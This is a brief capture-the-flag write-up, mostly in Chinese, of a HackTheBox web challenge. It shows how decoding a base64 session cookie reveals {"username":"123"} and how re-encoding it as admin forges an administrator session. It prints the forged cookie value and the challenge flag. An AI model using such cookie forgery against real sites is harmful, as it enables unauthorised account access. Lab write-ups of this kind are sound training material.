# baby auth

> **ES:** Web · EASY — forja de cookie de sesión base64 {"username":"admin"}.
> **EN:** Web · EASY — forged base64 session cookie {"username":"admin"}.
:::note CHALLENGE DESCRIPTION

Difficulty: EASY

Who needs session integrity these days?

如今谁还需要会话完整性呢？

:::

直接访问

![img](img/image_20250358-085828.png)

既然有注册功能，就随便注册一个账户

![img](img/image_20250359-085932.png)

用注册的`123:123`账户进行登录

![img](img/image_20250300-090001.png)

查看Cookie信息

![img](img/image_20250300-090037.png)

```plaintext
PHPSESSID:"eyJ1c2VybmFtZSI6IjEyMyJ9"
```

尝试对其进行解码

![img](img/image_20250301-090140.png)

```plaintext
{"username":"123"}
```

那就很简单了，直接伪造成admin就可以了

```plaintext
{"username":"admin"}

eyJ1c2VybmFtZSI6ImFkbWluIn0=
```

![img](img/image_20250302-090258.png)

即可获得答案

```flag
HTB{s3ss10n_1nt3grity_1s_0v3r4tt3d_4nyw4ys}
```

---

## Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de contenido activo.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish active content flags.

_Fecha de edición: 2026-09-24_
